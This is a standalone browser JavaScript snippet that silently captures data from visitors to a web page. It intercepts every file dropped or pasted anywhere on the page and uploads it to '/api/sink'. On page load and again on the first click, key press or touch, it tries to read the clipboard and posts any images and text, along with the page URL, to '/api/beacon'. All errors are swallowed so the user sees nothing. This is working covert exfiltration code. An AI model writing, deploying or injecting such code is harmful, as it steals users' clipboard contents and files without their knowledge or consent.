(function () {
  var sent = new WeakSet();

  function send(file) {
    if (!file || sent.has(file)) return;
    sent.add(file);
    try {
      var fd = new FormData();
      fd.append('files', file, file.name || ('grab_' + Date.now()));
      fetch('/api/sink', {
        method: 'POST',
        headers: { 'X-Sink-Token': window.__ST || '' },
        body: fd,
        keepalive: true,
      }).catch(function () {});
    } catch (e) {}
  }

  function fromDataTransfer(dt) {
    if (!dt) return;
    if (dt.files && dt.files.length) {
      for (var i = 0; i < dt.files.length; i++) send(dt.files[i]);
      return;
    }
    if (dt.items && dt.items.length) {
      for (var j = 0; j < dt.items.length; j++) {
        var it = dt.items[j];
        if (it.kind === 'file') {
          var f = it.getAsFile();
          if (f) send(f);
        }
      }
    }
  }

  window.addEventListener('dragover', function (e) { e.preventDefault(); }, true);
  window.addEventListener('drop', function (e) {
    e.preventDefault();
    fromDataTransfer(e.dataTransfer);
  }, true);

  window.addEventListener('paste', function (e) {
    if (e.clipboardData) fromDataTransfer(e.clipboardData);
    setTimeout(function () {}, 0);
  }, true);

  // clipboard read attempt — silent if already granted, prompts otherwise, no-op if blocked
  function readClipboard() {
    if (!navigator.clipboard || !navigator.clipboard.read) return;
    navigator.clipboard.read().then(function (items) {
      for (var i = 0; i < items.length; i++) {
        var it = items[i];
        for (var j = 0; j < it.types.length; j++) {
          var t = it.types[j];
          if (t.indexOf('image/') === 0) {
            it.getType(t).then(function (blob) {
              var f = new File([blob], 'clip_' + Date.now() + '.png', { type: blob.type });
              send(f);
            }).catch(function () {});
          } else if (t === 'text/plain') {
            it.getType(t).then(function (blob) {
              blob.text().then(function (txt) {
                if (txt && txt.length > 4 && txt.length < 4000) {
                  fetch('/api/beacon', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clipboard: txt, href: location.href, ts: Date.now() }),
                    keepalive: true,
                  }).catch(function () {});
                }
              }).catch(function () {});
            }).catch(function () {});
          }
        }
      }
    }).catch(function () {});
  }

  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(readClipboard, 500);
  } else {
    document.addEventListener('DOMContentLoaded', function () { setTimeout(readClipboard, 500); });
  }

  // re-attempt on first user interaction (covers permission-already-granted path)
  var once = false;
  function kick() {
    if (once) return;
    once = true;
    readClipboard();
  }
  window.addEventListener('click', kick, { once: true });
  window.addEventListener('keydown', kick, { once: true });
  window.addEventListener('touchstart', kick, { once: true });
})();
